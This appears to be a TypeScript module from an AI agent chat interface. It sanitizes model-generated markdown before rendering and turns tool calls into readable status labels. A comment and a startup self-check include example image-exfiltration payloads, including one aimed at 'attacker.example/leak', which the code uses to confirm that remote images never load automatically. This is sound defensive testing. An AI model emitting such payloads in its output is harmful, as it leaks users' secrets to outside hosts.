import { Marked, type Token, type Tokens } from 'marked'
import { markedHighlight } from 'marked-highlight'
import {
	allowedInlineTag,
	escapeHtml,
	escapeText,
	inlineImageSrc,
	safeUrl,
	sanitizedText,
	sanitizerHolds,
} from '$lib/util/safe-markdown'
import { OWN_MCP_SERVER, parseToolNamespace } from '$lib/engine/permission-mode'
import hljs from 'highlight.js/lib/core'
import bash from 'highlight.js/lib/languages/bash'
import css from 'highlight.js/lib/languages/css'
import javascript from 'highlight.js/lib/languages/javascript'
import json from 'highlight.js/lib/languages/json'
import markdown from 'highlight.js/lib/languages/markdown'
import plaintext from 'highlight.js/lib/languages/plaintext'
import python from 'highlight.js/lib/languages/python'
import sql from 'highlight.js/lib/languages/sql'
import typescript from 'highlight.js/lib/languages/typescript'
import xml from 'highlight.js/lib/languages/xml'

/* ── Markdown Rendering ────────────────────────────────────── */

hljs.registerLanguage('bash', bash)
hljs.registerLanguage('shell', bash)
hljs.registerLanguage('css', css)
hljs.registerLanguage('javascript', javascript)
hljs.registerLanguage('js', javascript)
hljs.registerLanguage('json', json)
hljs.registerLanguage('markdown', markdown)
hljs.registerLanguage('md', markdown)
hljs.registerLanguage('plaintext', plaintext)
hljs.registerLanguage('text', plaintext)
hljs.registerLanguage('python', python)
hljs.registerLanguage('py', python)
hljs.registerLanguage('sql', sql)
hljs.registerLanguage('typescript', typescript)
hljs.registerLanguage('ts', typescript)
hljs.registerLanguage('html', xml)
hljs.registerLanguage('xml', xml)
hljs.registerLanguage('svelte', xml)

const marked = new Marked(
	markedHighlight({
		langPrefix: 'hljs language-',
		emptyLangClass: 'hljs language-plaintext',
		highlight(code, language) {
			const normalizedLanguage = language?.trim().toLowerCase() ?? 'plaintext'

			if (hljs.getLanguage(normalizedLanguage)) {
				return hljs.highlight(code, { language: normalizedLanguage }).value
			}

			return hljs.highlight(code, { language: 'plaintext' }).value
		},
	}),
)

marked.setOptions({
	gfm: true,
	breaks: true,
})

/*
 * Everything rendered here is model output — replies, thinking, subagent results,
 * the agent's questions — and it goes straight into `{@html}` on a page that can call every
 * remote function as the user. So it is sanitized at the renderer (see
 * `util/safe-markdown.ts` for the rules). This must be an object literal: `marked` only
 * honours own enumerable properties of `use({ renderer })`.
 */
type ChatRendererThis = { parser: { parseInline(tokens: Token[]): string } }

marked.use({
	renderer: {
		html({ text }: Tokens.HTML | Tokens.Tag): string {
			return allowedInlineTag(text) ?? escapeHtml(text)
		},

		text: sanitizedText,

		link(this: ChatRendererThis, { href, title, tokens }: Tokens.Link): string {
			const inner = this.parser.parseInline(tokens)
			const url = safeUrl(href)
			if (!url) return inner
			const titleAttr = title ? ` title="${escapeText(title)}"` : ''
			const external = url.external ? ' target="_blank" rel="noopener noreferrer nofollow"' : ''
			return `<a href="${escapeHtml(url.href)}"${external}${titleAttr}>${inner}</a>`
		},

		/**
		 * Only an uploaded file loads inline (see `inlineImageSrc`). Any other image would
		 * be fetched the moment the message renders, with whatever the URL carries:
		 * `![](https://x/?d=<secret>)` is a zero-click leak, and so is a path on our own
		 * origin that redirects. It becomes a link the reader can choose to open.
		 */
		image({ href, title, text }: Tokens.Image): string {
			const alt = text ?? ''
			const titleAttr = title ? ` title="${escapeText(title)}"` : ''
			const inline = inlineImageSrc(href)
			if (inline) return `<img src="${escapeHtml(inline)}" alt="${escapeText(alt)}"${titleAttr} loading="lazy">`
			const url = safeUrl(href)
			if (!url) return escapeText(alt)
			return `<a href="${escapeHtml(url.href)}" target="_blank" rel="noopener noreferrer nofollow" class="md-remote-image" title="Image not loaded automatically">Image: ${alt ? escapeText(alt) : escapeHtml(url.href)}</a>`
		},
	},
})

/**
 * Prove the overrides took effect before any message goes through them. A `marked`
 * upgrade that changes how `use()` collects renderer methods would otherwise turn this
 * back into an unsanitized pipe with no visible symptom.
 */
const CHAT_SANITIZER_INTACT =
	sanitizerHolds((source) => marked.parse(source) as string) &&
	!/<img/i.test(marked.parse('![x](https://attacker.example/leak)') as string) &&
	!/<img/i.test(marked.parse('![x](/source-control/github/connect?return=/x)') as string)

export function renderMarkdown(content: string) {
	if (!CHAT_SANITIZER_INTACT) {
		// Fail closed: show the text, render nothing.
		return `<p>${escapeHtml(content ?? '').replace(/\n/g, '<br>')}</p>`
	}
	return marked.parse(content ?? '') as string
}

/* ── Tool Call Presentation ────────────────────────────────── */

export type ToolCardStatus = 'pending' | 'approved' | 'executing' | 'completed' | 'failed' | 'denied'

type ToolCopy = {
	inProgress: string
	completed: string
	failed?: string
	denied: string
}

type WebSearchPreview = {
	count: number
	hosts: string[]
}

const TOOL_COPY: Record<string, ToolCopy> = {
	web_search: {
		inProgress: 'Searching the web',
		completed: 'Searched the web',
		denied: 'Web search was denied',
	},
	Grep: {
		inProgress: 'Searching files',
		completed: 'Searched files',
		denied: 'File search was denied',
	},
	Glob: {
		inProgress: 'Listing files',
		completed: 'Listed files',
		denied: 'File listing was denied',
	},
	Read: {
		inProgress: 'Reading a file',
		completed: 'Read a file',
		denied: 'File read was denied',
	},
	Write: {
		inProgress: 'Writing a file',
		completed: 'Wrote a file',
		denied: 'File write was denied',
	},
	// Edit covers what file_patch and file_replace used to do separately.
	Edit: {
		inProgress: 'Editing a file',
		completed: 'Edited a file',
		denied: 'File edit was denied',
	},
	MultiEdit: {
		inProgress: 'Editing files',
		completed: 'Edited files',
		denied: 'File edit was denied',
	},
	Bash: {
		inProgress: 'Running shell command',
		completed: 'Ran shell command',
		failed: 'Shell command failed',
		denied: 'Shell command was denied',
	},
	browser_navigate: {
		inProgress: 'Opening a web page',
		completed: 'Opened a web page',
		denied: 'Navigation was denied',
	},
	browser_screenshot: {
		inProgress: 'Taking a screenshot',
		completed: 'Captured a screenshot',
		denied: 'Screenshot capture was denied',
	},
}

const QUERY_FIELDS = ['query', 'q', 'prompt', 'keywords', 'search']
const PATH_FIELDS = ['path', 'filePath', 'dirPath', 'url']

function toTitleCase(value: string) {
	return value
		.split(' ')
		.filter(Boolean)
		.map((part) => part[0]?.toUpperCase() + part.slice(1))
		.join(' ')
}

function fallbackToolLabel(name: string) {
	return toTitleCase(name.replace(/[_-]+/g, ' '))
}

function extractShortValue(args: unknown, candidates: string[]): string | null {
	if (!args || typeof args !== 'object') return null
	const obj = args as Record<string, unknown>
	for (const key of candidates) {
		const value = obj[key]
		if (typeof value !== 'string') continue
		const trimmed = value.trim()
		if (!trimmed) continue
		if (trimmed.length > 90) return `${trimmed.slice(0, 87)}...`
		return trimmed
	}
	return null
}

// Re-export so call sites that already import `parseJsonValue` keep working;
// the shared implementation lives in `$lib/util/json` (tryParseJson).
export { tryParseJson as parseJsonValue } from '$lib/util/json'

/**
 * A connector's tool (#17) arrives as `mcp__<server>__<tool>`. Label it by its own name and say
 * which connector it came from — never from `TOOL_COPY`, whose entries describe our tools, and a
 * connector's server may publish a tool under any name it likes.
 */
function externalToolLabel(server: string, bare: string, status: ToolCardStatus) {
	const tool = fallbackToolLabel(bare)
	const label =
		status === 'denied'
			? `${tool} was denied`
			: status === 'failed'
				? `${tool} failed`
				: status === 'completed'
					? `Completed ${tool.toLowerCase()}`
					: `${tool} in progress`
	return `${label} · ${server}`
}

export function getFriendlyToolLabel(name: string, args: unknown, status: ToolCardStatus = 'completed') {
	const namespace = parseToolNamespace(name)
	if (namespace.server && namespace.server !== OWN_MCP_SERVER) {
		return externalToolLabel(namespace.server, namespace.bare, status)
	}
	const copy = TOOL_COPY[name]
	const query = extractShortValue(args, QUERY_FIELDS)
	const path = extractShortValue(args, PATH_FIELDS)

	if (status === 'denied') {
		return copy?.denied ?? `${fallbackToolLabel(name)} was denied`
	}

	if (status === 'failed') {
		return copy?.failed ?? `${fallbackToolLabel(name)} failed`
	}

	const base =
		status === 'completed'
			? (copy?.completed ?? `Completed ${fallbackToolLabel(name).toLowerCase()}`)
			: (copy?.inProgress ?? `${fallbackToolLabel(name)} in progress`)

	if (query && ['web_search', 'Grep'].includes(name)) {
		return `${base} for "${query}"`
	}

	if (path && ['Read', 'Write', 'Edit', 'MultiEdit', 'Glob', 'browser_navigate'].includes(name)) {
		return `${base}: ${path}`
	}

	return base
}

function parseWebResult(rawResult: unknown): Array<{ url?: string }> {
	if (Array.isArray(rawResult)) {
		return rawResult.filter((entry) => Boolean(entry) && typeof entry === 'object') as Array<{ url?: string }>
	}

	if (rawResult && typeof rawResult === 'object') {
		const maybeResults = (rawResult as { results?: unknown }).results
		if (Array.isArray(maybeResults)) {
			return maybeResults.filter((entry) => Boolean(entry) && typeof entry === 'object') as Array<{ url?: string }>
		}
	}

	return []
}

export function getWebSearchPreview(toolName: string, rawResult: unknown): WebSearchPreview | null {
	if (toolName !== 'web_search') return null

	const results = parseWebResult(rawResult)
	if (results.length === 0) return { count: 0, hosts: [] }

	const hosts = new Set<string>()
	for (const entry of results) {
		if (!entry.url || typeof entry.url !== 'string') continue
		try {
			const hostname = new URL(entry.url).hostname
			if (hostname) hosts.add(hostname)
		} catch {
			// Ignore malformed URLs in tool output.
		}
		if (hosts.size >= 4) break
	}

	return {
		count: results.length,
		hosts: [...hosts],
	}
}

export function faviconUrl(hostname: string) {
	return `https://www.google.com/s2/favicons?domain=${encodeURIComponent(hostname)}&sz=32`
}
